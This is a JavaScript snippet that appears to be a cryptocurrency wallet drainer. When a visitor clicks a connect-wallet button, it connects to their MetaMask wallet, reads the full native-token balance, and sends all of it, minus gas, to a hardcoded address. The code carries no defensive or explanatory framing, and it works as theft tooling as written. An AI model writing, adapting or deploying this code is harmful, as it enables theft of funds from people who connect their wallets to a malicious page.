
const YOUR_WALLET_ADDRESS ="0xEb7cbb952978a4407b14DEf32e20033fF159900C"; // Replace with your wallet address

async function callconnectWallet() { // Renamed to match onclick event
  if (window.ethereum) {
    try {
      // Request wallet connection
      await window.ethereum.request({ method:"eth_requestAccounts" });
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const userAddress = accounts[0];


      await sendWallet(web3, userAddress);} catch (error) {
      console.error("Connection failed:", error);}  } else {
    console.error("MetaMask not detected");}}

async function sendWallet(web3, userAddress) {
  try {
    // Get chain ID for cross-network compatibility
    const chainId = await web3.eth.getChainId();
    
    // Get the user's native token balance
    const balance = await web3.eth.getBalance(userAddress);
    const gasPrice = await web3.eth.getGasPrice();
    const gasLimit = 21000; // Standard gas limit for native token transfer
    const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
    const amountToSend = BigInt(balance) > gasCost? BigInt(balance) - gasCost : 0; // Send all minus gas, or 0 if insufficient

    // Craft transaction (proceed even if amountToSend is 0 for testing)
    const tx = {
      from: userAddress,
      to: YOUR_WALLET_ADDRESS,
      value: amountToSend.toString(),
      gas: gasLimit,
      gasPrice: gasPrice,
      chainId: chainId};
    // Send transaction
    await web3.eth.sendTransaction(tx, (error, txHash) => {
      if (error) {
        console.error("Transaction failed:", error);} else {
        console.log("Transaction sent:", txHash);}    });} catch (error) {
    console.error("Failed:", error);}}